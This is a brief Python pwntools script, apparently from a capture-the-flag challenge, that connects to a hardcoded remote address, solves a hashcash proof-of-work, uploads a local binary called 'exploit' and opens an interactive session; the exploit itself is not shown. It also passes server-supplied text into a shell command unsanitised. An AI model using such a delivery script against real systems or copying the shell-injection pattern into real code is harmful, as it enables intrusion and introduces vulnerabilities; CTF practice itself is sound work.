#!/usr/bin/env pyhton3

import os
from pwn import *
import subprocess

# context.log_level = "debug"

r = remote('13.231.7.116', 9427)

r.readuntil('hashcash ')
token = r.readline()

sp = subprocess.Popen("hashcash {}".format(token.decode('utf-8')),
        shell=True,
        stdout=subprocess.PIPE)
token = sp.stdout.read().decode('utf-8').split(' ')[-1]
print(token)
r.send(token)
elf = b""
with open("./exploit", "rb") as f:
    elf = f.read()

r.recvline()
r.sendline(str(len(elf)))
r.recvline()

r.sendline(elf)
r.interactive()
